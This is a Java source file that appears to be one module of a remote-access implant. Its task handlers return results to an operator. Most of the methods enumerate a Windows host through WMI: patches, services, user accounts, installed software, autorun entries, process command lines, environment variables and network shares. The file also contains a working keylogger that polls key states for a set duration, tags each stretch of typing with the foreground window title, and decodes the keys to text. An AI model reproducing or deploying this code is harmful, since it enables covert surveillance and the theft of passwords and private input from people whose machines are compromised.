package agent;

import com.sun.jna.platform.win32.COM.WbemcliUtil;
import com.sun.jna.platform.win32.Ole32;
import com.sun.jna.platform.win32.User32;
import static com.sun.jna.platform.win32.Win32VK.*;
import static com.sun.jna.platform.win32.WinUser.*;
import com.sun.jna.platform.win32.Win32VK;

import java.time.LocalDateTime;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Hashtable;

import static com.sun.jna.platform.win32.WinUser.MAPVK_VSC_TO_VK_EX;


public class windows {
    enum Win32_HotFix_Values {
        HotFixID,
        InstalledOn
    }

    enum Win32_Service_Values {
        StartName,
        DisplayName,
        State,
        PathName,
        Description,
        StartMode
    }

    enum Win32_UserAccount_Values {
        Name,
        SID,
        AccountType,
        Disabled,
        Description,
        Domain
    }
    enum Win32_Product_Values {
        Name,
        Version,
        Vendor,
        PackageName,
        InstallState
    }

    enum Win32_Autorun_Values {
        Name,
        Location,
        Command
    }

    enum Win32_Process_Values {
        Name,
        ProcessID,
        CommandLine
    }

    enum Win32_Environment_Values {
        Name,
        UserName,
        VariableValue
    }

    enum Win32_Share_Values {
        Name,
        Path,
        Caption
    }

    public static Hashtable wmiHotfix(Hashtable args) {
        String wmiOut = new String();
        Hashtable taskOut = new Hashtable();
        if (System.getProperty("os.name").toLowerCase().contains("windows")) {
            ArrayList wmiResult = new ArrayList();
            WbemcliUtil.WmiQuery<Win32_HotFix_Values> serialNumberQuery = new WbemcliUtil.WmiQuery<Win32_HotFix_Values>("Win32_QuickFixEngineering", Win32_HotFix_Values.class);
            Ole32.INSTANCE.CoInitializeEx(null, Ole32.COINIT_MULTITHREADED);
            WbemcliUtil.WmiResult<Win32_HotFix_Values> result = serialNumberQuery.execute();
            for (int i = 0; i < result.getResultCount(); i++) {
                Hashtable hotfixTable = new Hashtable();
                hotfixTable.put("HotFixID",result.getValue(Win32_HotFix_Values.HotFixID, i));
                hotfixTable.put("InstalledOn",result.getValue(Win32_HotFix_Values.InstalledOn, i));
                wmiResult.add(hotfixTable);
            }
            Ole32.INSTANCE.CoUninitialize();
            wmiOut = wmiResult.toString();
        } else {
            wmiOut = "error - operating system not compatible with this directive";
        }
        taskOut.put("output", wmiOut);
        return taskOut;
    }


    public static Hashtable wmiService(Hashtable args) {
        String wmiOut = new String();
        Hashtable taskOut = new Hashtable();
        if (System.getProperty("os.name").toLowerCase().contains("windows")) {
            ArrayList wmiResult = new ArrayList();
            WbemcliUtil.WmiQuery<Win32_Service_Values> serialServiceQuery = new WbemcliUtil.WmiQuery<Win32_Service_Values>("Win32_Service", Win32_Service_Values.class);
            Ole32.INSTANCE.CoInitializeEx(null, Ole32.COINIT_MULTITHREADED);

            WbemcliUtil.WmiResult<Win32_Service_Values> result = serialServiceQuery.execute();
            for (int i = 0; i < result.getResultCount(); i++) {
                Hashtable serviceTable = new Hashtable();
                String[] objIndex = new String[] {"DisplayName","StartName","State","PathName","StartMode"};
                String[] objProperties = new String[] {
                        (String) result.getValue(Win32_Service_Values.DisplayName, i),
                        (String) result.getValue(Win32_Service_Values.StartName, i),
                        (String) result.getValue(Win32_Service_Values.State, i),
                        (String) result.getValue(Win32_Service_Values.PathName, i),
                        (String)result.getValue(Win32_Service_Values.StartMode, i)
                };
                for (int s = 0; s < objProperties.length; s++) {
                    try {
                        serviceTable.put(objIndex[s],objProperties[s]);
                    } catch (NullPointerException e) {
                        serviceTable.put(objIndex[s],"[]");
                    }
                }
                wmiResult.add(serviceTable);
            }
            Ole32.INSTANCE.CoUninitialize();
            wmiOut = wmiResult.toString();
        } else {
            wmiOut = "error - operating system not compatible with this directive";
        }
        taskOut.put("output",wmiOut);
        return taskOut;
    }

    public static Hashtable wmiUser(Hashtable args) {
        String wmiOut = new String();
        Hashtable taskOut = new Hashtable();
        if (System.getProperty("os.name").toLowerCase().contains("windows")) {
            ArrayList wmiResult = new ArrayList();
            WbemcliUtil.WmiQuery<Win32_UserAccount_Values> serialServiceQuery = new WbemcliUtil.WmiQuery<Win32_UserAccount_Values>("Win32_UserAccount",Win32_UserAccount_Values.class);
            Ole32.INSTANCE.CoInitializeEx(null, Ole32.COINIT_MULTITHREADED);

            WbemcliUtil.WmiResult<Win32_UserAccount_Values> result = serialServiceQuery.execute();
            for (int i = 0; i < result.getResultCount(); i++) {
                Hashtable accountTable = new Hashtable();
                accountTable.put("Name",result.getValue(Win32_UserAccount_Values.Name, i));
                accountTable.put("SID",result.getValue(Win32_UserAccount_Values.SID, i));
                accountTable.put("AccountType",result.getValue(Win32_UserAccount_Values.AccountType, i));
                accountTable.put("Disabled",result.getValue(Win32_UserAccount_Values.Disabled, i));
                accountTable.put("Description",result.getValue(Win32_UserAccount_Values.Description, i));
                accountTable.put("Domain",result.getValue(Win32_UserAccount_Values.Domain, i));
                wmiResult.add(accountTable);
            }
            Ole32.INSTANCE.CoUninitialize();
            wmiOut = wmiResult.toString();
        } else {
            wmiOut = "error - operating system not compatible with this directive";
        }
        taskOut.put("output",wmiOut);
        return taskOut;
    }

    public static Hashtable wmiInstalled(Hashtable args) {
        String wmiOut = new String();
        Hashtable taskOut = new Hashtable();
        if (System.getProperty("os.name").toLowerCase().contains("windows")) {
            ArrayList wmiResult = new ArrayList();
            WbemcliUtil.WmiQuery<Win32_Product_Values> serialServiceQuery = new WbemcliUtil.WmiQuery<Win32_Product_Values>("Win32_Product",Win32_Product_Values.class);
            Ole32.INSTANCE.CoInitializeEx(null, Ole32.COINIT_MULTITHREADED);

            WbemcliUtil.WmiResult<Win32_Product_Values> result = serialServiceQuery.execute();
            for (int i = 0; i < result.getResultCount(); i++) {
                Hashtable packageTable = new Hashtable();
                packageTable.put("Name",result.getValue(Win32_Product_Values.Name, i));
                packageTable.put("Version",result.getValue(Win32_Product_Values.Version, i));
                packageTable.put("Vendor",result.getValue(Win32_Product_Values.Vendor, i));
                packageTable.put("PackageName",result.getValue(Win32_Product_Values.PackageName, i));
                packageTable.put("InstallState",result.getValue(Win32_Product_Values.InstallState, i));
                wmiResult.add(packageTable);
            }
            Ole32.INSTANCE.CoUninitialize();

            wmiOut = wmiResult.toString();
        } else {
            wmiOut = "error - operating system not compatible with this directive";
        }
        taskOut.put("output",wmiOut);
        return taskOut;
    }

    public static Hashtable wmiAutorun(Hashtable args) {
        String wmiOut = new String();
        Hashtable taskOut = new Hashtable();
        if (System.getProperty("os.name").toLowerCase().contains("windows")) {
            ArrayList wmiResult = new ArrayList();
            WbemcliUtil.WmiQuery<Win32_Autorun_Values> serialServiceQuery = new WbemcliUtil.WmiQuery<Win32_Autorun_Values>("Win32_Startupcommand",Win32_Autorun_Values.class);
            Ole32.INSTANCE.CoInitializeEx(null, Ole32.COINIT_MULTITHREADED);

            WbemcliUtil.WmiResult<Win32_Autorun_Values> result = serialServiceQuery.execute();
            for (int i = 0; i < result.getResultCount(); i++) {
                Hashtable autorunTable = new Hashtable();
                autorunTable.put("Name",result.getValue(Win32_Autorun_Values.Name, i));
                autorunTable.put("Location",result.getValue(Win32_Autorun_Values.Location, i));
                autorunTable.put("Command",result.getValue(Win32_Autorun_Values.Command, i));
                wmiResult.add(autorunTable);
            }
            Ole32.INSTANCE.CoUninitialize();

            wmiOut = wmiResult.toString();
        } else {
            wmiOut = "error - operating system not compatible with this directive";
        }
        taskOut.put("output",wmiOut);
        return taskOut;
    }

    public static Hashtable wmiProcess(Hashtable args) {
        String wmiOut = new String();
        Hashtable taskOut = new Hashtable();
        if (System.getProperty("os.name").toLowerCase().contains("windows")) {
            ArrayList wmiResult = new ArrayList();
            WbemcliUtil.WmiQuery<Win32_Process_Values> serialServiceQuery = new WbemcliUtil.WmiQuery<Win32_Process_Values>("Win32_Process",Win32_Process_Values.class);
            Ole32.INSTANCE.CoInitializeEx(null, Ole32.COINIT_MULTITHREADED);

            WbemcliUtil.WmiResult<Win32_Process_Values> result = serialServiceQuery.execute();
            for (int i = 0; i < result.getResultCount(); i++) {
                Hashtable procTable = new Hashtable();
                procTable.put("Name",result.getValue(Win32_Process_Values.Name, i));
                procTable.put("ProcessID",result.getValue(Win32_Process_Values.ProcessID, i));
                String command = (String) result.getValue(Win32_Process_Values.CommandLine, i);
                if (command == null) {
                    procTable.put("CommandLine", "[]");
                } else {
                    procTable.put("CommandLine", command);
                }
                wmiResult.add(procTable);
            }
            Ole32.INSTANCE.CoUninitialize();

            wmiOut = wmiResult.toString();
        } else {
            wmiOut = "error - operating system not compatible with this directive";
        }
        taskOut.put("output",wmiOut);
        return taskOut;
    }

    public static Hashtable wmiEnvironment(Hashtable args) {
        String wmiOut = new String();
        Hashtable taskOut = new Hashtable();
        if (System.getProperty("os.name").toLowerCase().contains("windows")) {
            ArrayList wmiResult = new ArrayList();
            WbemcliUtil.WmiQuery<Win32_Environment_Values> serialServiceQuery = new WbemcliUtil.WmiQuery<Win32_Environment_Values>("Win32_Environment",Win32_Environment_Values.class);
            Ole32.INSTANCE.CoInitializeEx(null, Ole32.COINIT_MULTITHREADED);

            WbemcliUtil.WmiResult<Win32_Environment_Values> result = serialServiceQuery.execute();
            for (int i = 0; i < result.getResultCount(); i++) {
                Hashtable envTable = new Hashtable();
                envTable.put("Name",result.getValue(Win32_Environment_Values.Name, i));
                envTable.put("VariableValue",result.getValue(Win32_Environment_Values.VariableValue, i));
                wmiResult.add(envTable);
            }
            Ole32.INSTANCE.CoUninitialize();
            wmiOut = wmiResult.toString();
        } else {
            wmiOut = "error - operating system not compatible with this directive";
        }
        taskOut.put("output",wmiOut);

        return taskOut;
    }

    public static Hashtable wmiShare(Hashtable args) {
        String wmiOut = new String();
        Hashtable taskOut = new Hashtable();
        if (System.getProperty("os.name").toLowerCase().contains("windows")) {
            ArrayList wmiResult = new ArrayList();
            WbemcliUtil.WmiQuery<Win32_Share_Values> serialServiceQuery = new WbemcliUtil.WmiQuery<Win32_Share_Values>("Win32_Share",Win32_Share_Values.class);
            Ole32.INSTANCE.CoInitializeEx(null, Ole32.COINIT_MULTITHREADED);

            WbemcliUtil.WmiResult<Win32_Share_Values> result = serialServiceQuery.execute();
            for (int i = 0; i < result.getResultCount(); i++) {
                Hashtable shareTable = new Hashtable();
                shareTable.put("Name",result.getValue(Win32_Share_Values.Name, i));
                shareTable.put("Path",result.getValue(Win32_Share_Values.Path, i));
                shareTable.put("Caption",result.getValue(Win32_Share_Values.Caption, i));
                wmiResult.add(shareTable);
            }
            Ole32.INSTANCE.CoUninitialize();
            wmiOut = wmiResult.toString();
        } else {
            wmiOut = "error - operating system not compatible with this directive";
        }
        taskOut.put("output",wmiOut);

        return taskOut;
    }



    public static Hashtable asynckeystateLogger(Hashtable args) {

        Hashtable taskOut = new Hashtable();
        final User32 user32 = User32.INSTANCE;
        LocalDateTime endTimes = LocalDateTime.now().plusSeconds(Integer.parseInt(args.get("duration").toString()));
        ArrayList keyStates = new ArrayList();
        ArrayList shiftStates = new ArrayList();
        Hashtable activeWindows = new Hashtable();
        String windowTitle = new String();

        while (LocalDateTime.now().isBefore(endTimes)) {
            String windowName = currentWindow(user32);
            if (!windowTitle.equals(windowName)) {
                windowTitle = windowName;
                activeWindows.put(keyStates.size(),windowName);
            }

            //get the virtual key codes
            for (int k = 0; k < 255; k++) {
                //get states of virtual key codes
                short kState = user32.GetAsyncKeyState(k);
                if (kState == -32767) {
                    shiftStates.add(user32.GetAsyncKeyState(Win32VK.VK_SHIFT.code));
                    keyStates.add(k);
                }
            }
        }

        taskOut.put("output",stringifyKeys(shiftStates,keyStates,user32,activeWindows));
        return taskOut;
    }

    public static Hashtable mapConstants() {
        //https://docs.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
        Hashtable constantTable = new Hashtable();
        constantTable.put(VK_RETURN.code,"\\r\\n");
        constantTable.put(VK_TAB.code,"\\t");
        constantTable.put(VK_UP.code," [ARROW-UP] ");
        constantTable.put(VK_DOWN.code," [ARROW-DOWN] ");
        constantTable.put(VK_LEFT.code," [ARROW-LEFT] ");
        constantTable.put(VK_RIGHT.code," [ARROW-RIGHT] ");
        constantTable.put(VK_SNAPSHOT.code," [PRINTSCREEN] ");
        constantTable.put(VK_ESCAPE.code," [ESC] ");
        constantTable.put(VK_DELETE.code," [DELETE] ");
        constantTable.put(VK_INSERT.code," [INSERT] ");
        constantTable.put(VK_OEM_PLUS.code,"=+");
        constantTable.put(VK_OEM_COMMA.code,",<");
        constantTable.put(VK_OEM_MINUS.code,"-_");
        constantTable.put(VK_OEM_PERIOD.code,".>");
        constantTable.put(VK_OEM_1.code,";:");
        constantTable.put(VK_OEM_2.code,"/?");
        constantTable.put(VK_OEM_3.code,"`~");
        constantTable.put(VK_OEM_4.code,"[{");
        constantTable.put(VK_OEM_5.code,"\\|");
        constantTable.put(VK_OEM_6.code,"]}");
        constantTable.put(VK_OEM_7.code,"'\"");
        constantTable.put(VK_F1.code," [f1] ");
        constantTable.put(VK_F2.code," [f2] ");
        constantTable.put(VK_F3.code," [f3] ");
        constantTable.put(VK_F4.code," [f4] ");
        constantTable.put(VK_F5.code," [f5] ");
        constantTable.put(VK_F6.code," [f6] ");
        constantTable.put(VK_F7.code," [f7] ");
        constantTable.put(VK_F8.code," [f8] ");
        constantTable.put(VK_F9.code," [f9] ");
        constantTable.put(VK_F10.code," [f10] ");
        constantTable.put(VK_F11.code," [f11] ");
        constantTable.put(VK_F12.code," [f12] ");
        constantTable.put(VK_F13.code," [f13] ");
        constantTable.put(VK_F14.code," [f14] ");
        constantTable.put(VK_F15.code," [f15] ");
        constantTable.put(VK_F16.code," [f16] ");
        constantTable.put(VK_F17.code," [f17] ");
        constantTable.put(VK_F18.code," [f18] ");
        constantTable.put(VK_F19.code," [f19] ");
        constantTable.put(VK_F20.code," [f20]");
        constantTable.put(VK_F21.code," [f21] ");
        constantTable.put(VK_F22.code," [f22] ");
        constantTable.put(VK_F23.code," [f23] ");
        constantTable.put(VK_F24.code," [f24] ");
        constantTable.put(VK_BACK.code," [BACKSPACE] ");
        constantTable.put(VK_0.code,"0)");
        constantTable.put(VK_1.code,"1!");
        constantTable.put(VK_2.code,"2@");
        constantTable.put(VK_3.code,"3#");
        constantTable.put(VK_4.code,"4$");
        constantTable.put(VK_5.code,"5%");
        constantTable.put(VK_6.code,"6^");
        constantTable.put(VK_7.code,"7&");
        constantTable.put(VK_8.code,"8*");
        constantTable.put(VK_9.code,"9(");
        return constantTable;

    }

    public static String stringifyKeys(ArrayList shiftStates, ArrayList keyStates, User32 user32, Hashtable activeWindows) {
        Hashtable constantTable = mapConstants();
        StringBuilder keyStrokes = new StringBuilder();
        System.out.println(activeWindows.toString());
        for (int v = 0; v<keyStates.size();v++) {
            if (activeWindows.containsKey(v)) {
                keyStrokes.append("\\r\\n["+activeWindows.get(v).toString()+"]\\r\\n");
            }
            int virtualKey = (int) keyStates.get(v);
            short shiftOn = (short) shiftStates.get(v);
            if (constantTable.containsKey(virtualKey)) {
                String keyMap = constantTable.get(virtualKey).toString();
                if (keyMap.length() == 2) {
                    if (shiftOn != 0) {
                        keyStrokes.append(keyMap.charAt(1));
                    } else {
                        keyStrokes.append(keyMap.charAt(0));
                    }
                } else {
                    keyStrokes.append(keyMap);
                }
            } else {

                char[] keyStr = new char[5];
                byte[] stateBytes = new byte[255];
                //map virtual keys to scancodes
                int scan = user32.MapVirtualKeyEx(virtualKey, MAPVK_VK_TO_VSC_EX, user32.GetKeyboardLayout(0));

                //takes virtual key, scancode, key state as bytes array, receiving buffer, receiving buffer size, function behavior (0 / 2 are only options), locale identifier

                user32.ToUnicodeEx(virtualKey, scan, stateBytes, keyStr, keyStr.length, 0, user32.GetKeyboardLayout(0));

                if (keyStr[0] != -1) {
                    String keyVal = String.valueOf(keyStr);

                    if (shiftOn == 0) {
                        keyStrokes.append(keyVal);
                    } else {
                        keyStrokes.append(keyVal.toUpperCase());
                    }
                } else {
                    continue;
                }
            }

        }
        return keyStrokes.toString();
    }

    public static String currentWindow(User32 user32) {
        char[] windowName = new char[256];
        HWND windowHandle = user32.GetForegroundWindow();
        user32.GetWindowText(windowHandle,windowName, 256);
        return String.valueOf(windowName);
    }

}
